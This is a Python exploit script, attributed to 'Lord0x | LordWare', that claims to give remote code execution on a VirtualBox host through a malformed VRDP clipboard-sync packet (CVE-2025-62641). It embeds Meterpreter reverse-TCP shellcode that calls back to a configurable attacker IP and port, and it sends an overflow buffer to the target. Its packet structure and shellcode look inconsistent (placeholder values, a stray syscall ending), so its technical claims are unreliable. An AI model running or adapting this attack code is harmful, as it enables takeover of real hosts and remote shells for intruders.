#!/usr/bin/env python3
# CVE-2025-62641 - VirtualBox Core RCE via VRDP Clipboard Sync
# Auther: Lord0x | LordWare

import socket
import struct
import time
import os

# ================= CONFIG =================
TARGET_HOST = "192.168.56.1"      # VBox Host IP
TARGET_PORT = 3389                # VRDP Port
ATTACKER_IP = "192.168.45.100"    # YOUR ATTACKER IP 
ATTACKER_PORT = 4444
# =========================================

# Shellcode: x64 Windows - Meterpreter Reverse TCP
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.100 LPORT=4444 -f python


SHELL코드 = (
    b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
    b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
    b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
    b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xb0\x01\x41\xc1"
    b"\xc8\x0d\x41\x01\xc8\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
    b"\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80"
    b"\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48"
    b"\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b"
    b"\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9"
    b"\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
    b"\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
    b"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
    b"\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
    b"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57"
    b"\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41"
    b"\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49"
    b"\xbc\x02\x00" + struct.pack("!H", ATTACKER_PORT) + socket.inet_aton(ATTACKER_IP) +
    b"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x4c\x89\xf2\x4d\x31\xc0"
    b"\x4d\x31\xc9\x48\x31\xc0\xb0\x03\x0f\x05"
)

def build_vrdp_packet():
    packet = b""
    packet += struct.pack("<I", 0x56524450)    
    packet += struct.pack("<I", 1)             # V
    packet += struct.pack("<I", 0x10000000)    
    
    # Malformed CLIPBOARD_SYNC
    packet += struct.pack("<I", 0x00000005)    
    packet += struct.pack("<I", 0xFFFFFFFF)    
    packet += struct.pack("<I", 0xDEADBEEF)
    
    # Payload buffer
    evil = b"A" * 1024
    evil += b"\x00\x00"
    evil += SHELL코드
    evil += b"\x90" * (2048 - len(SHELL코드))
    
    packet += struct.pack("<I", len(evil) + 0x80000000)
    packet += evil
    return packet

def trigger():
    print("[+] Connecting to VRDP...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((TARGET_HOST, TARGET_PORT))
        print("[+] Sending overflow packet...")
        s.send(build_vrdp_packet())
        time.sleep(3)
        print("[!] Payload delivered. Check your listener!")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    print("="*60)
    print("              CVE-2025-62641 - VirtualBox RCE")
    print("  Guest Host Takeover | Evil Edition | By Lord0x | LordWare")
    print("   Telegram: https://t.me/Official_LordWare | X: @Al_Lord0x")
    print("="*60)
    trigger()